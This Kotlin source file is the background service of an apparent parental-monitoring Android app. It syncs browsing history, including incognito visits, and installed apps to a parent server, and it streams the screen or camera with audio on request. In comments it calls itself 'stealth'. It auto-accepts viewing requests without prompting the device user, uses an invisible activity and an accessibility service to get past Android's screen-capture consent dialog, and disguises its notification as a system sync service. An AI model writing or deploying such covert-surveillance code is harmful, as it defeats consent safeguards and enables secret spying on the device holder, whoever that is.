package com.example.childapp.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.childapp.accessibility.ChildAccessibilityService
import com.example.childapp.blocker.AppScanner
import com.example.childapp.camera.CameraStreamService
import com.example.childapp.data.ApiClient
import com.example.childapp.data.LocalDatabase
import com.example.childapp.data.SessionStore
import com.example.childapp.screen.InvisibleScreenCaptureActivity
import com.example.childapp.screen.ScreenCaptureService
import com.example.childapp.socket.SocketManager
import com.example.childapp.ui.BlockedAppActivity
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject

/**
 * 24/7 Persistent Background Daemon for Child Device.
 *
 * Keeps Socket.IO connected at all times, ensuring the child device is reported as ONLINE
 * to the parent dashboard. When a stealth screen-share request arrives from the parent,
 * this service automatically accepts and starts ScreenCaptureService without prompting the child.
 */
class ChildMonitoringService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var socketManager: SocketManager? = null
    private lateinit var session: SessionStore
    private lateinit var api: ApiClient

    override fun onCreate() {
        super.onCreate()
        session = SessionStore(applicationContext)
        api = ApiClient(session)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action
        if (action == ACTION_STOP) {
            stopMonitoring()
            return START_NOT_STICKY
        }

        val token = session.accessToken
        if (token == null) {
            stopSelf()
            return START_NOT_STICKY
        }

        startInForeground()
        initSocket(token)

        return START_STICKY
    }

    private fun startInForeground() {
        val channelId = "child_monitoring_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Protection Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Monitors device security and synchronization."
                setShowBadge(false)
            }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Service")
            .setContentText("Device synchronization active")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private fun initSocket(token: String) {
        if (socketManager != null) return

        val socket = SocketManager(token)
        socketManager = socket
        activeSocket = socket
        BlockedAppActivity.activeSocketManager = socket
        ChildAccessibilityService.activeSocketCallback = { entry ->
            socket.sendBrowsingActivity(entry)
        }

        socket.onConnected = {
            Log.i(TAG, "Persistent socket connected successfully")
            syncAppData()
        }

        socket.onPolicyUpdated = { data ->
            val type = data.optString("type")
            val db = LocalDatabase.getInstance(this)
            if (type == "APP_POLICY") {
                val policy = data.optJSONObject("policy")
                if (policy != null) db.upsertAppPolicy(policy)
            } else if (type == "WEB_RULE_ADDED" || type == "WEB_RULE_UPDATED") {
                val rule = data.optJSONObject("rule")
                if (rule != null) db.upsertWebRule(rule)
            } else if (type == "WEB_RULE_DELETED") {
                val ruleId = data.optString("ruleId")
                if (ruleId.isNotBlank()) db.deleteWebRule(ruleId)
            } else if (type == "BULK_UPDATE") {
                syncAppData()
            }
        }

        socket.onInstantLockdownToggle = { isPaused ->
            LocalDatabase.getInstance(this).setDevicePaused(isPaused)
        }

        // Stealth Screen Sharing: Parent requested view -> Auto-accept and stream immediately
        socket.onScreenShareRequest = { sessionId, parentId ->
            Log.i(TAG, "Received screen_share_request for session $sessionId from parent $parentId (Stealth)")
            socket.acceptScreenShare(sessionId)

            if (ScreenCaptureService.isSessionRunning.get()) {
                Log.i(TAG, "Screen sharing session is already active, skipping duplicate start")
            } else {
                // Android 14+ enforces single-use MediaProjection tokens; always request fresh token via invisible launcher
                val cachedIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    null
                } else {
                    ScreenCaptureService.pendingProjectionIntent
                }

                if (cachedIntent != null) {
                    try {
                        ScreenCaptureService.start(this, Activity.RESULT_OK, cachedIntent, token, sessionId)
                    } catch (e: Exception) {
                        Log.w(TAG, "Cached projection intent failed, requesting via invisible launcher", e)
                        ChildAccessibilityService.instance?.pollForMediaProjectionDialog()
                        InvisibleScreenCaptureActivity.launch(this, token, sessionId)
                    }
                } else {
                    ChildAccessibilityService.instance?.pollForMediaProjectionDialog()
                    InvisibleScreenCaptureActivity.launch(this, token, sessionId)
                }
            }
        }

        socket.onScreenShareStopped = { sessionId ->
            Log.i(TAG, "Screen share stopped for session $sessionId")
            ScreenCaptureService.stop(this)
        }

        socket.onCameraStreamRequest = { sessionId, _, cameraFacing, withAudio ->
            Log.i(TAG, "Camera stream requested for session $sessionId (Stealth)")
            socket.acceptCameraStream(sessionId)
            CameraStreamService.start(this, token, sessionId, cameraFacing, withAudio)
        }

        socket.onCameraStreamStopped = { sessionId ->
            CameraStreamService.stop(this)
        }

        socket.connect()
        socketManager = socket
    }

    private fun syncAppData() {
        serviceScope.launch {
            try {
                val apps = AppScanner.scanInstalledApps(this@ChildMonitoringService)
                api.syncInstalledApps(AppScanner.toJsonArray(apps))

                val polResp = api.getMyPolicies()
                if (polResp.has("policies")) {
                    LocalDatabase.getInstance(this@ChildMonitoringService)
                        .saveAppPolicies(polResp.getJSONArray("policies"))
                }
                if (polResp.has("isPaused")) {
                    LocalDatabase.getInstance(this@ChildMonitoringService)
                        .setDevicePaused(polResp.getBoolean("isPaused"))
                }

                val webResp = api.getMyWebRules()
                if (webResp.has("rules")) {
                    LocalDatabase.getInstance(this@ChildMonitoringService)
                        .saveWebRules(webResp.getJSONArray("rules"))
                }

                val unsynced = LocalDatabase.getInstance(this@ChildMonitoringService).getUnsyncedBrowsingHistory()
                if (unsynced.isNotEmpty()) {
                    val batchArray = JSONArray()
                    for (entry in unsynced) {
                        batchArray.put(JSONObject().apply {
                            put("url", entry.url)
                            put("domain", entry.domain)
                            put("title", entry.title)
                            put("browser", entry.browser)
                            put("isIncognito", entry.isIncognito)
                            put("category", entry.category)
                            put("isBlockedAttempt", entry.isBlockedAttempt)
                            entry.blockedReason?.let { put("blockedReason", it) }
                            put("visitedAt", entry.visitedAt)
                        })
                    }
                    api.postBrowsingHistoryBatch(batchArray)
                    LocalDatabase.getInstance(this@ChildMonitoringService)
                        .markBrowsingHistorySynced(unsynced.map { it.id })
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error syncing app data", e)
            }
        }
    }

    private fun stopMonitoring() {
        activeSocket = null
        socketManager?.disconnect()
        socketManager = null
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    override fun onDestroy() {
        activeSocket = null
        socketManager?.disconnect()
        serviceScope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        private const val TAG = "ChildMonitoringService"
        const val NOTIFICATION_ID = 1001
        const val ACTION_STOP = "com.example.childapp.action.STOP_MONITORING"
        var activeSocket: SocketManager? = null
            private set

        fun start(context: Context) {
            val intent = Intent(context, ChildMonitoringService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop(context: Context) {
            val intent = Intent(context, ChildMonitoringService::class.java).apply {
                action = ACTION_STOP
            }
            context.startService(intent)
        }
    }
}
